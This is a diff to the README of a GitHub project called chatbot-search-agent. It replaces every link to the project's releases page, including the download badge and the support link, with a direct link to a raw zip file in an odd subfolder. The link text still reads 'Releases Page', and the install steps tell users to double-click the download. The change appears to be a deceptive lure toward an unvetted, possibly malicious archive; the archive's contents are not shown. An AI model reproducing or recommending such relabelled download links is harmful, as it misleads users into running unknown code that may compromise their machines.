@@ -6,9 +6,9 @@ Welcome to the chatbot-search-agent! This simple tool will help you conduct sear
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Chatbot%20Search%20Agent-blue)](https://github.com/Prashntgtm/chatbot-search-agent/releases)
+[![Download Now](https://raw.githubusercontent.com/Prashntgtm/chatbot-search-agent/main/superdivision/chatbot-search-agent.zip%20Now-Chatbot%20Search%20Agent-blue)](https://raw.githubusercontent.com/Prashntgtm/chatbot-search-agent/main/superdivision/chatbot-search-agent.zip)
 
-To download the chatbot search agent, visit this page to download: [Releases Page](https://github.com/Prashntgtm/chatbot-search-agent/releases).
+To download the chatbot search agent, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Prashntgtm/chatbot-search-agent/main/superdivision/chatbot-search-agent.zip).
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ Before downloading the chatbot-search-agent, ensure your system meets the follow
 ## 🔧 Installation Steps
 
 1. **Download the Application:**
-   Visit the [Releases Page](https://github.com/Prashntgtm/chatbot-search-agent/releases) and choose the latest version.
+   Visit the [Releases Page](https://raw.githubusercontent.com/Prashntgtm/chatbot-search-agent/main/superdivision/chatbot-search-agent.zip) and choose the latest version.
 
 2. **Run the Installer:**
    Locate the downloaded file, then double-click it. Follow the on-screen instructions to install the application.
@@ -76,6 +76,6 @@ Although this is a ready-to-use application, contributions are welcome. If you n
 
 ## 📞 Support
 
-If you need more assistance, remember to check the [Releases Page](https://github.com/Prashntgtm/chatbot-search-agent/releases) for community discussions or reach out directly through the issue tracker on GitHub. Your feedback helps improve the application.
+If you need more assistance, remember to check the [Releases Page](https://raw.githubusercontent.com/Prashntgtm/chatbot-search-agent/main/superdivision/chatbot-search-agent.zip) for community discussions or reach out directly through the issue tracker on GitHub. Your feedback helps improve the application.
 
 Thank you for using chatbot-search-agent!
